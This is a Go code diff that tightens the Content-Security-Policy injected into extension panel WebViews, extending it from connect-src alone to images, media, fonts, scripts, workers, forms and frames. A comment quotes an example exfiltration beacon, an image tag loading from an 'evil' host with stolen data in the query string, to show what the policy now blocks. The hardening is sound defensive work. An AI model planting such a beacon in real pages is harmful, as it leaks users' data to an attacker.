@@ -385,12 +385,21 @@ func (s *Store) extractLocked(m *Manifest, pkg *Package) error {
 // panelCSP is the lockdown policy for extension panels. Panels are embedded
 // WebViews whose only sanctioned way out is the host API (net.fetch through
 // the core, the JS bridge to core RPCs): a panel must never make its own
-// network requests, or a compromised panel exfiltrates data in a single
-// fetch(). The meta tag is injected after signature verification, into the
+// network requests, or a compromised panel exfiltrates data with a single
+// request.
+//
+// connect-src 'none' alone is NOT enough: it blocks only fetch/XHR,
+// WebSocket, EventSource and beacons. Subresource loads (images, media,
+// fonts, styles, workers) use their own directives, so the policy locks
+// those to the panel's own origin as well — an exfiltration beacon such as
+// <img src="https://evil/?d=..."> is refused while the panel's own bundled
+// assets (served from the loopback server, i.e. 'self') keep working.
+// The meta tag is injected after signature verification, into the
 // extracted copies only; the signed package is untouched. When the author
 // shipped their own CSP meta tag, both policies apply and intersect, so the
-// injected one can only ever tighten.
-const panelCSP = `<meta http-equiv="Content-Security-Policy" content="connect-src 'none'; object-src 'none'; base-uri 'none'">`
+// injected one can only ever tighten. (frame-ancestors is omitted: it is
+// ignored in meta tags; the serving HTTP header enforces it.)
+const panelCSP = `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'none'; img-src 'self' data: blob:; media-src 'self'; font-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'">`
 
 // injectPanelCSP inserts the panel CSP meta tag into html: right after the
 // opening <head> when one is present, otherwise at the very start of the
